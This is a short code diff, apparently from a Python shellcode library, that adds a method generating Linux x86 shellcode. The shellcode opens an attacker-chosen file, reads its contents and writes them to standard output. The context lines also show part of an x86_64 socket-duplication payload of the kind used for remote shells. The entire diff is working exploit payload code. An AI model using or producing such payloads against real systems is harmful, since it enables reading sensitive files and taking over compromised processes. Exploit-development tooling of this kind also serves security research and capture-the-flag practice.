@@ -309,6 +309,37 @@ class x86:
 		code = code % addr
 		return Shellcode(asm(code,'x86'))
 
+	def read_file(self,file_name):
+		sc = \
+		'''
+			push 5
+			pop eax
+			call get_eip
+			add ebx,0x24
+			xor ecx,ecx
+			xor edx,edx
+			int 0x80
+			push eax
+			push 3
+			pop eax
+			pop ebx
+			mov ecx,esp
+			push 0xff
+			pop edx
+			int 0x80
+			xor ebx,ebx
+			inc ebx
+			push 4
+			pop eax
+			int 0x80
+		get_eip:
+			mov ebx,[esp]
+			ret
+		'''
+		asm_code = asm(sc,'x86')
+		asm_code += file_name + '\x00'
+		return Shellcode(asm_code)
+
 class x86_64:
 	def dupsSock(self,fd=4):
 		dups = "\x48\x31\xf6\x6a"
